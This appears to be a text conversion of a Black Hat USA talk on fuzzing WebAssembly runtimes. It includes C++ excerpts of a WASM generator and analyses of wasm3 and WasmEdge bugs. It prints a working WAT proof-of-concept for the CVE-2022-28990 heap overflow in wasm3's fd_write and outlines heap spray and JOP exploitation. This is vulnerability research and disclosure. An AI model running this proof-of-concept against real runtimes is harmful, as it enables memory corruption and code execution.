# Is WebAssembly Really Safe? - Wasm VM Escape and RCE Vulnerabilities Discovered in a New Way

## Speaker: Zhao Hai (@h1zhao)
### Event: #BHUSA @BlackHatEvents
### Information Classification: General

## About Us
**TianYu Lab of Cyberpeace Tech Co., Ltd.**
- **Supervisor:** Lei Li
- **Manager:** Mengchen Yu
- **Researchers:** Zhichen Wang, Hai Zhao

## Agenda
1. Introduction to WebAssembly Runtime
2. Development of WebAssembly Fuzzing Tools
3. Vulnerability Analysis and Exploit Development
4. Conclusion

## Focus: WebAssembly Runtime
- **Previous Research:** Focused on...
- **Our Interest:** WebAssembly Runtime

## WebAssembly Runtime Architecture
- The stack is divided into two parts.
- **Bounds Check:** Ensures memory safety.
- **WASI (WebAssembly System Interface):** Similar to system calls in C, providing a standardized interface for WebAssembly modules.
- **Docker Integration:** (Further details needed)

## WebAssembly Runtime Vulnerability
- **Bounds Check:** While the WASM standard is generally safe, runtime implementations can be vulnerable.
- **Potential Vulnerabilities:** Bounds check bypass, buffer overflows, etc.

## WASM Fuzzing Tool Development
- **Focus Areas:**
  - WASM file structure
  - WASI API
  - Bytecode implementation in the runtime
- **Coverage-Guided Fuzzing:**
  - Uses AFL/libfuzzer output samples as input data, mapping them to WASM files.
  - Ensures coverage-guided fuzzing by generating specific samples.

## WASM Generator / Structure
- **Development:**
  - Follows the WASM format.
  - Non-randomizable fields are fixed or calculated, while randomizable fields use data from fuzzer samples.
  - Example:
    ```cpp
    class Section {
      public:
        virtual SectionId id() = 0;
        virtual void generate(Context *context);
        virtual void getEncode(DataOutputStream *out);
    };
    ```
  - **Strategic Data Generation:**
    - Higher frequency for boundary values (e.g., `0xffffffff` for integers, `NAN` for floats/doubles).
    - Data is read from fuzzer output samples.

## WASM Generator / ByteCode
- **ByteCode Generation:**
  - Generates bytecode sequences within the WASM file.
  - Example:
    ```cpp
    class Instruction {
      public:
        virtual void generate(Context *context) = 0;
        virtual void getByteCode(DataOutputStream *code) = 0;
    };
    ```
  - **Avoiding Recursion:**
    - Uses DFS algorithm to check for loops.
    - Example:
      ```cpp
      void Instruction::Call::generate(Context *context) { 
        f.generate(context);
        while (context->check_loop(from_where, f.value)) {
          f.value++; 
        }
        context->add_cfg(from_where, f.value);
      }
      ```

## WASM Generator / WASI
- **WASI API Fuzzing:**
  - Imports WASI API strings in the Import Section.
  - Example:
    ```cpp
    map<string, string> imports_function;
    vector<string> imports_function_name;

    #define ADD_IMPORT_FUNC(name, module) \
      imports_function[name] = module; \
      imports_function_name.push_back(name);

    void initImportsFunction() {
      ADD_IMPORT_FUNC("args_get", "wasi_snapshot_preview1");
      ADD_IMPORT_FUNC("args_sizes_get", "wasi_snapshot_preview1");
      // ...
    }

    void Sections::ImportType::generate(Context *context) {
      string &n = CHOICE_VEC(imports_function_name); 
      name = strdup(n.c_str());
      name_len = strlen(name);
      module = strdup(imports_function[n].c_str());
      module_len = strlen(module);
      // ...
    }
    ```

## Vulnerability: CVE-2022-28990
- **Heap Overflow in WASI read/write API in wasm3:**
  - Example:
    ```cpp
    m3ApiRawFunction(m3wasigenericfdread) {
      m3ApiReturnType(uint32_t);
      m3ApiGetArg(uvwasifdt, fd);
      m3ApiGetArgMem(wasiiovect, wasiiovs);
      m3ApiGetArg(uvwasisizet, iovslen);
      m3ApiGetArgMem(uvwasisizet, nread);
      m3ApiCheckMem(wasiiovs, iovslen * sizeof(wasiiovect));
      m3ApiCheckMem(nread, sizeof(uvwasisizet));
      // ...
    }
    ```
  - **POC:**
    ```wasm
    (module
      (type (;0;) (func))
      (type (;1;) (func (param i32 i32 i32 i32) (result i32)))
      (import "wasi_snapshot_preview1" "fd_write" (func $__fd_write (type 1)))
      (func $_start (type 0)
        i32.const 0
        i32.const 0x10000
        i32.store
        i32.const 0x4
        i32.const 0xffff
        i32.store
        i32.const 0x100
        i32.const 0
        i32.store
        i32.const 0x1
        i32.const 0x0
        i32.const 0x1
        i32.const 0x100
        call $__fd_write
        drop
      )
      (memory (;0;) 0x2)
      (export "_start" (func $_start))
    )
    ```
  - **Exploit:**
    - Heap spray to manipulate memory layout.
    - Use JOP (Jump-Oriented Programming) to control VM execution flow.
    - Example:
      ```cpp
      d_m3Op(opcode_xx) {
        // do something
        nextOp();
      }
      ```

## Vulnerability: Slot Missing in Bytecode
- **Issue:**
  - No slot emission if the value is in a register.
  - Example:
    ```cpp
    static M3Result Compile_Memory_CopyFill(IM3Compilation o, m3opcode_t i_opcode) {
      // ...
      EmitOp(o, op);
      PopType(o, c_m3Type_i32);
      EmitSlotNumOfStackTopAndPop(o);
      EmitSlotNumOfStackTopAndPop(o);
      // ...
    }

    d_m3Op(MemFill) {
      u32 size = (u32)_r0;
      u32 byte = slot(u32);
      u64 destination = slot(u32);
      // ...
    }

    static inline M3Result EmitSlotNumOfStackTopAndPop(IM3Compilation o) {
      if (IsStackTopInSlot(o))
        EmitSlotOffset(o, GetStackTopSlotNumber(o));
      return Pop(o);
    }
    ```
  - **Impact:**
    - Results in segmentation fault, unexploitable.

## WasmEdge - Architecture
- **VM Architecture:**
  - Differs from wasm3, using a "while-switch" to dispatch opcodes.
- **Br Opcode Analysis:**
  - Example:
    ```cpp
    Executor::execute(Runtime::StoreManager &StoreMgr,
                      Runtime::StackManager &StackMgr,
                      const AST::InstrView::iterator Start,
                      const AST::InstrView::iterator End) {
      // ...
    }
    ```

For more details, please refer to the full presentation and associated research.